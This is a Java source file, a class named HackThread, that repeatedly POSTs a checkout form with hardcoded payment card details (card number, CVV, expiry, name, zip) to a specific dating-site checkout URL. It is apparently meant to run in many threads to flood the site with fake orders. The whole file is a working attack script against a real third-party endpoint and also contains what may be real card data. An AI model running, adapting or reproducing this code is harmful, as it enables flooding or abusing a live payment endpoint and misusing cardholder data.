package com.tdd;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URLConnection;
import java.net.URLEncoder;

public class HackThread implements Runnable {
	
	private static final String URL = "https://datingcursor.com/land/12/checkout";
	private static final String charset = "UTF-8";
	private String name;
	
	public HackThread(String name){
		this.name = name;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		System.out.println("Start thead " + name);
		try{
			
			String query = String.format("u=%s&m_checkout_start=%s&upsell1=%s&upsell2=%s&upsell3=%s&ccname=%s&ccvv=%s&zip=%s&ccnum=%s&ccmon=%s&ccyear=%s", 
				    URLEncoder.encode("917dbdf1bc1b9976951f9635d2db630b", charset), 
				    URLEncoder.encode("1531080503", charset),
				    URLEncoder.encode("datingsiren.com", charset),
				    URLEncoder.encode("seductivehero.com", charset),
				    URLEncoder.encode("datingtrap.com", charset),
				    URLEncoder.encode("me lames esta", charset),
				    URLEncoder.encode("455", charset),
				    URLEncoder.encode("94536", charset),
				    URLEncoder.encode("4912849518936677", charset),
				    URLEncoder.encode("04", charset),
				    URLEncoder.encode("2020", charset));
			
			URLConnection connection = null;
	    	OutputStream output = null;
	    	InputStream response = null;
	    	BufferedReader reader = null;
			connection = new java.net.URL(URL).openConnection();
			connection.setDoOutput(true); // Triggers POST.
			connection.setRequestProperty("Accept-Charset", charset);
			connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=" + charset);
			
			output = connection.getOutputStream();
			output.write(query.getBytes(charset));
			
			response = connection.getInputStream();
			reader = new BufferedReader(new InputStreamReader(response,charset));
			/*
			for (String line; (line = reader.readLine()) != null;) {
				System.out.println(line);
			}
			*/
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			System.out.println("End thead " + name);
		}
	}
}
